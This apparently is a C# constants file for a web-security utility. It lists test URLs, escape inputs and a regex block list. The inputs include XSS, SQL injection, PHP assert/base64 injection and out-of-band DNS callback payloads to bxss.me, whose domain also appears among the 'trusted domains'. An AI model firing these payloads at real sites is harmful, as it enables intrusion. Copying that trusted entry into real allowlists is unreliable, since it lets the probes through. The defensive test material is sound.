namespace SecureWebUtils
{
    public static class Consts
    {
        // List of URLs
        public static readonly string[] Urls =
        {
            "https://www.example.com",
            "invalid-url",
            "ftp://fileserver.com/file.txt",
            "http://example.com/test?param=+A'.concat(70-3).concat(22*4).concat(111).concat(82).concat(97).concat(81)+(require'socket' Socket",
            "http://example.com/test?param='.print(md5(31337)).'",
            "http://bxss.me/t/xss.html?%00",
            "http://example.com/test?param=+A'.concat(70-3).concat(22*4).concat(101).concat(72).concat(99).concat(77)+(require'socket' Socket.gethostbyname('hitzm'+'blcxxmkm72746.bxss.me.')[3].to_s)+'",
            "http://example.com/test?param=;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));",
            "http://example.com/test?param=(nslookup hitykvtnlzdfc44bc4.bxss.me||perl -e \"gethostbyname('hitykvtnlzdfc44bc4.bxss.me')\")"
        };

        // List of EscapeInputs
        public static readonly string[] EscapeInputs =
        {
            "<script>alert('XSS Attack!')</script>",
            "'+A'.concat(70-3).concat(22*4).concat(111).concat(82).concat(97).concat(81)+(require'socket' Socket",
            "'.print(md5(31337)).'",
            "bxss.me/t/xss.html?%00",
            "'+A'.concat(70-3).concat(22*4).concat(101).concat(72).concat(99).concat(77)+(require'socket' Socket.gethostbyname('hitzm'+'blcxxmkm72746.bxss.me.')[3].to_s)+'",
            ";assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));",
            "(nslookup hitykvtnlzdfc44bc4.bxss.me||perl -e \"gethostbyname('hitykvtnlzdfc44bc4.bxss.me')\")",
            "SELECT * FROM users WHERE username = 'admin' --",
            "DROP TABLE users;",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "vbscript:msgbox('XSS')",
            "perl -e 'print \"Content-type: text/html\\n\\nHello, world!\"'",
            "php -r 'echo \"Hello, world!\";'",
            "python -c 'print(\"Hello, world!\")'",
            "SELECT password FROM users WHERE username='admin' AND password='password'",
            "' UNION SELECT null, null, null --",
            "cmd /c calc.exe"
        };

        // List of trusted domains (for example purposes)
        public static readonly string[] TrustedDomains =
        {
        "example.com",
        "fileserver.com",
        "bxss.me",
        "trusted.com",
        "secure.net",
        "safe.org",
        "mywebsite.com",
        "mycompany.com",
        "partner-site.com",
        "example.net",
        "example.org",
        "trusted-site.com",
        "safe-site.net",
        "secure-site.org",
        "valid-domain.com",
        "partner-company.net",
        "affiliate-site.org",
        "mytrustedsite.com",
        "business-portal.com",
        "corporate-site.net",
        "trusted-service.org",
        "service-provider.com",
        "official-website.net",
        "authorized-domain.org",
        "partner-network.com",
        "vendor-site.net",
        "service-site.org",
        "official-site.com",
        "affiliate-network.net",
        "authorized-service.org",
        "securedomain.com",
        "safeaccess.net",
        "mytrustedpartner.org",
        "business-site.com",
        "verified-site.net",
        "securityportal.org",
        "clients-portal.com",
        "trusted-source.net",
        "reliable-source.org"
        };

        // List of dangerous patterns
        public static readonly string[] DangerousPatterns =
        {
            @"<script.*?>.*?</script.*?>",  // Script tags
            @"<iframe.*?>.*?</iframe.*?>",  // Iframe tags
            @"<object.*?>.*?</object.*?>",  // Object tags
            @"<embed.*?>.*?</embed.*?>",    // Embed tags
            @"<applet.*?>.*?</applet.*?>",  // Applet tags
            @"<style.*?>.*?</style.*?>",    // Style tags
            @"<link.*?>.*?</link.*?>",      // Link tags
            @"<img.*?>.*?>",                // Image tags
            @"javascript:",                 // JavaScript URLs
            @"vbscript:",                   // VBScript URLs
            @"data:",                       // Data URLs
            @"base64,",                     // Base64 URLs
            @"expression\(",                // CSS expressions
            @"on\w+\s*=",                   // Inline event handlers
            @"eval\(",                      // eval function
            @"alert\(",                     // alert function
            @"prompt\(",                    // prompt function
            @"confirm\(",                   // confirm function
            @"\bexec\b",                    // exec command
            @"\brequire\b",                 // require function
            @"\bsocket\b",                  // socket function
            @"\bnslookup\b",                // nslookup command
            @"\bgethostbyname\b",           // gethostbyname function
            @"\bmd5\b",                     // md5 function
            @"\bperl\b",                    // perl command
            @"\bpython\b",                  // python command
            @"\bphp\b",                     // php command
            @"base64_decode",               // base64_decode function
            @"concat\(",                    // concat function
            @"assert\(",                    // assert function
            @"(dns|jndi).*?//",             // dns/jndi protocols
            @"\bselect\b",                  // SQL select command
            @"\binsert\b",                  // SQL insert command
            @"\bupdate\b",                  // SQL update command
            @"\bdelete\b",                  // SQL delete command
            @"\bdrop\b",                    // SQL drop command
            @"\bunion\b",                   // SQL union command
            @"\bfrom\b",                    // SQL from clause
            @"\bwhere\b",                   // SQL where clause
            @"--",                          // SQL comment
            @";--",                         // SQL comment
            @"\bshutdown\b",                // SQL shutdown command
            @"\bexec\b",                    // SQL exec command
            @"\bxp_cmdshell\b",             // SQL xp_cmdshell command
            @"\bexec\b\s*\(",               // SQL exec function
            @"\bsp_oacreate\b",             // SQL sp_oacreate function
            @"\bsp_oamethod\b",             // SQL sp_oamethod function
            @"\bsp_oagetproperty\b",        // SQL sp_oagetproperty function
            @"\bsp_oasetproperty\b",        // SQL sp_oasetproperty function
            @"\bsp_oafree\b"                // SQL sp_oafree function
        };
    }
}
